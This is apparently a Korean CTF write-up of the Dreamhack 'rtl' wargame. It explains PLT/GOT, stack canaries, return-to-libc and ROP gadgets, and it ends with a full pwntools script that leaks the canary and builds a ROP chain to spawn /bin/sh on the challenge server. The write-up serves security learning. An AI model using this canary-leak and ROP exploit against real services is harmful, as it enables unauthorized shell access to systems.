---
tags: [dreamhack, wargame, write-up]		
---

@PLT

ELF 바이너리에서 외부 바이너리 함수(system, puts, printf 등)은 실행파일 안에 실제 코드가 없고, glibc 같은 외부에서 제공된다.

근데 어디 있는지는 런타임에만 알 수 있어서 아래와 같이 동작한다.

1. PLT : 실행파일에 고정된 점프 테이블
2. GOT (Global Offset Table) : 실제 함수 주소를 담는 테이블 (런타임에 채워짐)

```bash
main() → call system@plt
```

→ PLT → GOT (비어있음)
→ dynamic linker가 찾음
→ GOT에 진짜 system 주소 넣음
→ PLT → GOT (진짜 주소 있음)
→ system 함수 실행

![Image](/assets/img/rtl/image1.png)

![Image](/assets/img/rtl/image2.png)

![Image](/assets/img/rtl/image3.png)

카나리는 보통 스택 보호(stack canary) 기능의 일부인데, 이 값은 프로세스가 실행될 때마다 새로 생성된다. 즉, 카나리는 프로세스 단위로 고정된다.

해당 프로그램은 한 세션에서 두 번의 read를 사용하기 때문에 첫 read에서 canary의 값을 얻어내고, 두번째 read에서 해당 canary 값을 포함한 payload를 전송하여 return address를 system(/bin/sh) 주소로 변경시키면 되는 문제로 추정된다.

리턴주소를 조작해서 libc에 있는 함수(system 등)를 호출하는 기술을 RTL(Return to Libc)라고하는데, 

32bit 환경과 64bit 환경에서의 RTL은 차이가 있다.

32bit에서는 함수 인자를 스택에 push해서 전달한다.

ex)

```bash
payload = b"A"*offset
payload += p32(system_addr)
payload += p32(exit_addr)         # system 끝나고 exit 호출할 주소
payload += p32(binsh_addr)        # system의 인자
```

64bit에서는 인자를 스택이 아닌 레지스터로 전달한다.

ex)

```bash
payload = b"A"*offset
payload += p64(pop_rdi_ret)
payload += p64(binsh_addr)
payload += p64(system_addr)
```

단순히 RET를 덮는 것 만으로는 안 되고, system()을 호출하기 전에 RDI에 우리가 원하는 값을 직접 넣어줘야 한다.

그래서 필요한 게 바로 ROP 가젯(pop rdi; ret)이다.

해당 문제는 64bit환경이다.

따라서 우리가 알아내야 할 정보는 system() 주소, binsh 문자열 주소, ROP 가젯, canary 이다.

1. system()

![Image](/assets/img/rtl/image4.png)

system 함수의 PLT , GOT 주소는 위와 같이 찾을 수 있다.

우리는 PLT 주소를 사용할 것이기 때문에 필요한 값은 “0x4005d0”이다.

1. binsh

![Image](/assets/img/rtl/image5.png)

pwndbg의 search 명령어를 사용하면 binsh의 주소가 3개 뜨는데, system 함수의 경우 인자로 문자열의 주소를 필요로 하기 때문에 우리에게 필요한 주소는 “0x400874”가 된다.

1. canary

![Image](/assets/img/rtl/image6.png)

buf부터 rbp까지의 거리: 0x40

buf부터 canary까지의 거리: 0x40-0x08 = 0x38

1. ROP gadget

```bash
ROPgadget --binary ./rtl | grep "pop rdi"
```

![Image](/assets/img/rtl/image7.png)

ROP 가젯 : 0x0000000000400853

그리고 여기에 추가적으로,

현재 버퍼를 오버플로우 시켜서 → 카나리 덮고 → SFP 덮고 → 리턴주소를 덮는 과정에서 우리가 덮는 리턴 주소 때문에 스택 포인터(rsp)가 8바이트 밀리는 현상이 발생할 수 있다.

그런데 system()이나 puts() 같은 함수들은 내부적으로 SSE 명령어 등 16바이트 정렬이 필요한 명령어를 쓰는 경우가 있다.

따라서 system() 호출 직전에 ret 가젯을 추가해서 현재 깨져있는 rsp를 +8 올려서 정렬을 맞춰줘야 한다.

1. ret

```bash
ROPgadget --binary ./rtl | grep "ret$"
```

![Image](/assets/img/rtl/image8.png)

```bash
from pwn import *

p = remote('host3.dreamhack.games', 15020)

pop_rdi_ret = 0x400853
bin_sh_addr = 0x400874
system_plt = 0x4005d0
ret = 0x400596

payload = b'A'*0x39
p.sendafter(b'Buf: ',payload)
p.recvuntil(payload)

canary = u64(p.recv(7).rjust(8, b"\x00"))
print('canary', hex(canary))

payload = b'A'*0x38
payload += p64(canary)
payload += b'B'*8
payload += p64(pop_rdi_ret)
payload += p64(bin_sh_addr)
payload += p64(ret)
payload += p64(system_plt)

p.sendafter(b'Buf: ', payload)
p.interactive()
```

![Image](/assets/img/rtl/image9.png)